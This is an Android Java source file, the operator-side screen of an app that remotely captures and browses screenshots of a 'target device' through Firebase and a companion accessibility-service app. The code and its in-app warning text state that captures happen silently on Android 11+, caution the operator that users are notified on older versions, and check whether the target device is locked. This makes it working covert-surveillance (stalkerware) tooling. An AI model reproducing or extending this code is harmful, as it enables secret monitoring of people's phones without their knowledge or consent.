package com.reiserx.myapplication24.Activities.ScreenShots;

import android.annotation.SuppressLint;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.Query;
import com.google.firebase.firestore.QueryDocumentSnapshot;
import com.google.firebase.firestore.QuerySnapshot;
import com.reiserx.myapplication24.Adapters.Screenshot.screenShotImageAdapter;
import com.reiserx.myapplication24.Advertisements.InterstitialAdsClass;
import com.reiserx.myapplication24.Advertisements.bannerAdsClass;
import com.reiserx.myapplication24.Classes.SnackbarTop;
import com.reiserx.myapplication24.Classes.postRequest;
import com.reiserx.myapplication24.Models.TaskSuccess;
import com.reiserx.myapplication24.Models.downloadUrl;
import com.reiserx.myapplication24.Models.performTask;
import com.reiserx.myapplication24.R;
import com.reiserx.myapplication24.databinding.ActivityScreenShotsBinding;

import java.util.ArrayList;
import java.util.Objects;

public class ScreenShotsActivity extends AppCompatActivity {

    ActivityScreenShotsBinding binding;

    ArrayList<downloadUrl> data;
    screenShotImageAdapter adapter;

    String UserID;

    FirebaseFirestore firestore;

    int pastVisiblesItems, totalItemCount, first_visible_item;
    boolean scrolling = false;
    LinearLayoutManager layoutManager;
    Query first;

    String TAG = "thhgshgshfs";

    QuerySnapshot check;

    DatabaseReference reference;
    ValueEventListener valueEventListener;

    ProgressDialog prog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityScreenShotsBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        bannerAdsClass bannerAdsClass = new bannerAdsClass(this, binding.bannerAdHolder);
        bannerAdsClass.adsCode();

        UserID = getIntent().getStringExtra("UserID");

        firestore = FirebaseFirestore.getInstance();

        binding.rec.setVisibility(View.GONE);
        binding.progHolder.setVisibility(View.VISIBLE);
        binding.progressBar2.setVisibility(View.VISIBLE);
        binding.textView9.setVisibility(View.GONE);

        setTitle("Screenshots");

        data = new ArrayList<>();
        layoutManager = new LinearLayoutManager(this);
        binding.rec.setLayoutManager(layoutManager);
        adapter = new screenShotImageAdapter(this, data, UserID, findViewById(android.R.id.content));
        binding.rec.setAdapter(adapter);
        refresh();

        binding.floatingActionButton3.setOnClickListener(view -> {
            AlertDialog.Builder dialog = new AlertDialog.Builder(this);

            prog = new ProgressDialog(this);
            prog.setMessage("Processing");
            dialog.setTitle("Get screenshot");
            dialog.setMessage("Get screenshot of the target device");
            dialog.setPositiveButton("get", (dialogInterface, i) -> process());
            dialog.setNegativeButton("cancel", null);
            dialog.show();
        });
    }

    @SuppressLint({"NotifyDataSetChanged", "SetTextI18n"})
    public void refresh () {

        Query query = firestore.collection("Main").document(UserID).collection("ScreenShots")
                .orderBy("timeStamp", Query.Direction.DESCENDING).limit(30);
        query.addSnapshotListener((task, error) -> {
            if (task != null) {
                data.clear();
                for (DocumentSnapshot document : Objects.requireNonNull(task.getDocuments())) {
                    downloadUrl cn = document.toObject(downloadUrl.class);
                    if (cn != null) {
                        cn.setId(document.getId());
                        data.add(cn);
                    }
                }
                if (!data.isEmpty()) {
                    binding.rec.setVisibility(View.VISIBLE);
                    binding.progHolder.setVisibility(View.GONE);
                    adapter.notifyDataSetChanged();
                    setTitle("Screenshots ".concat(String.valueOf(data.size())));
                    adapter.notifyDataSetChanged();
                    binding.rec.scheduleLayoutAnimation();
                    check = task;
                    scrolls(task.getDocuments()
                            .get(task.size() - 1));
                } else {
                    binding.textView9.setText("No data available");
                    binding.rec.setVisibility(View.GONE);
                    binding.progHolder.setVisibility(View.VISIBLE);
                    binding.progressBar2.setVisibility(View.GONE);
                    binding.textView9.setVisibility(View.VISIBLE);
                }
            } else {
                binding.textView9.setText(String.valueOf(error));
                binding.rec.setVisibility(View.GONE);
                binding.progHolder.setVisibility(View.VISIBLE);
                binding.progressBar2.setVisibility(View.GONE);
                binding.textView9.setVisibility(View.VISIBLE);
            }
        });
    }

    public void scrolls(DocumentSnapshot lastVisibles) {
        binding.rec.addOnScrollListener(new RecyclerView.OnScrollListener() {
            @Override
            public void onScrolled(@NonNull RecyclerView recyclerView, int dx, int dy) {
                super.onScrolled(recyclerView, dx, dy);

                if (dy > 0) { //check for scroll down

                    first_visible_item = layoutManager.findFirstVisibleItemPosition();
                    totalItemCount = layoutManager.getItemCount();
                    pastVisiblesItems = layoutManager.findLastVisibleItemPosition();

                    if ((first_visible_item + pastVisiblesItems) >= totalItemCount) {
                        if (!scrolling) {
                            scrolling = true;
                            if (check != null) {
                                if (check.size()-1 < 9) {
                                    Toast.makeText(ScreenShotsActivity.this, "loaded all", Toast.LENGTH_SHORT).show();
                                } else {
                                    ref(10, lastVisibles);
                                    Log.d(TAG, "load");
                                }
                            } else Log.d(TAG, "jidsnf");
                        } else Log.d(TAG, "not scrolling");
                    } else {
                        Log.d(TAG, "total: "+totalItemCount);
                        Log.d(TAG, "first: "+first_visible_item);
                        Log.d(TAG, "last: "+pastVisiblesItems);
                    }
                }
            }
        });
    }

    @SuppressLint({"NotifyDataSetChanged", "SetTextI18n"})
    public void ref(int limit, DocumentSnapshot lastVisible) {
        Log.d(TAG, "loading");
        if (lastVisible != null) {
            first = firestore.collection("Main").document(UserID).collection("ScreenShots")
                    .orderBy("timeStamp", Query.Direction.DESCENDING).startAfter(lastVisible).limit(limit);
        } else {
            first = firestore.collection("Main").document(UserID).collection("ScreenShots")
                    .orderBy("timeStamp", Query.Direction.DESCENDING).limit(limit);
        }

        first.get().addOnSuccessListener((value) -> {
            if (value != null && !value.isEmpty()) {
                for (DocumentSnapshot document : Objects.requireNonNull(value.getDocuments())) {
                    downloadUrl cn = document.toObject(downloadUrl.class);
                    if (cn != null) {
                        cn.setId(document.getId());
                    }
                    data.add(cn);
                }
                if (!data.isEmpty()) {
                    binding.rec.setVisibility(View.VISIBLE);
                    binding.progHolder.setVisibility(View.GONE);
                    adapter.notifyDataSetChanged();
                    binding.rec.scheduleLayoutAnimation();
                    setTitle("Screenshots ".concat(String.valueOf(data.size())));
                } else {
                    binding.textView9.setText("No data available");
                    binding.rec.setVisibility(View.GONE);
                    binding.progHolder.setVisibility(View.VISIBLE);
                    binding.progressBar2.setVisibility(View.GONE);
                    binding.textView9.setVisibility(View.VISIBLE);
                }
                adapter.notifyDataSetChanged();
                scrolls(value.getDocuments()
                        .get(value.size() - 1));
                scrolling = false;
            } else {
                SnackbarTop snackbarTop = new SnackbarTop(findViewById(android.R.id.content));
                snackbarTop.showSnackBar("Loaded all data", true);
            }
        });
    }
    @SuppressLint("NonConstantResourceId")
    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        if (item.getItemId() == R.id.scrn_shot_info) {
            alertDialogs();
        }
        return super.onOptionsItemSelected(item);
    }

    public void alertDialogs () {
        AlertDialog.Builder dialog = new AlertDialog.Builder(this);
        dialog.setMessage("This will take screenshot SILENTLY in API 30+ (Android 11+), and will take screenshot GLOBALLY in API 28-29 (Android 9-10)\nGLOBALLY means this will take screenshot same as you take it and the user will be notified\nSo be carefull when you use this feature for Android 9-10\n\nAccessibility service needs to be running for taking screenshots, you can check its status in operations activity");
        dialog.setTitle("Alert");
        dialog.setPositiveButton("ok", null);
        dialog.show();
    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.scrnshot_menu, menu);
        return super.onCreateOptionsMenu(menu);
    }
    private void process() {
        prog.show();

        DatabaseReference scrnLock = FirebaseDatabase.getInstance().getReference("Main").child(UserID).child("ServiceStatus").child("screenLock");
        scrnLock.addListenerForSingleValueEvent(new ValueEventListener() {
            @SuppressLint("SetTextI18n")
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    boolean value = snapshot.getValue(Boolean.class);
                    if (value) {
                        SnackbarTop snackbarTop = new SnackbarTop(findViewById(android.R.id.content));
                        snackbarTop.showSnackBar("Can't get screenshot, target device is locked", false);
                    } else {
                        SnackbarTop snackbarTop = new SnackbarTop(findViewById(android.R.id.content));

                        prog.dismiss();
                        AlertDialog.Builder request = new AlertDialog.Builder(ScreenShotsActivity.this);
                        request.setTitle("Screenshot");
                        request.setMessage("Please select one of the options");
                        request.setPositiveButton("Command A", (dialogInterface, i) -> {
                            performTask performTask = new performTask("get", 14, UserID);
                            performTask.Task();
                            snackbarTop.showSnackBar("Just wait a moment", true);
                            InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(ScreenShotsActivity.this);
                            interstitialAdsClass.loadAds();
                        });
                        request.setNegativeButton("command b", (dialogInterface, i) -> {
                            prog.show();
                            getToken("com.reiserx.testtrace.accessibility", "1", UserID);
                        });
                        request.setNeutralButton("cancel", null);
                        request.show();

                        reference = FirebaseDatabase.getInstance().getReference().child("Main").child(UserID).child("Screenshot").child("listener");
                        valueEventListener = reference.addValueEventListener(new ValueEventListener() {
                            @Override
                            public void onDataChange(@NonNull DataSnapshot snapshot) {
                                if (snapshot.exists()) {
                                    TaskSuccess data = snapshot.getValue(TaskSuccess.class);
                                    if (data != null) {
                                        snackbarTop.showSnackBar(data.getMessage(), data.isSuccess());
                                        if (data.isFinal()) {
                                            reference.removeValue();
                                            if (valueEventListener != null) {
                                                reference.removeEventListener(valueEventListener);
                                            }
                                        }
                                    }
                                }
                            }

                            @Override
                            public void onCancelled(@NonNull DatabaseError error) {

                            }
                        });
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
    }

    private void getToken(String title, String msg, String UserID) {

        InterstitialAdsClass interstitialAdsClass = new InterstitialAdsClass(this);
        interstitialAdsClass.loadAds();
        FirebaseFirestore db = FirebaseFirestore.getInstance();

        CollectionReference docRef = db.collection("Main").document(UserID).collection("TokenUrl");
        docRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                for (QueryDocumentSnapshot document : Objects.requireNonNull(task.getResult())) {
                    postRequest postRequest = new postRequest(String.valueOf(document.getData().get("Notification token")), title, msg, prog, 7, ScreenShotsActivity.this);
                    postRequest.notifyBackground();
                }
            } else {
                Log.d("fbbfbfwfbbff", "Error getting documents: ", task.getException());
                Toast.makeText(this, String.valueOf(task.getException()), Toast.LENGTH_SHORT).show();
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (valueEventListener != null) {
            reference.removeEventListener(valueEventListener);
        }
    }
}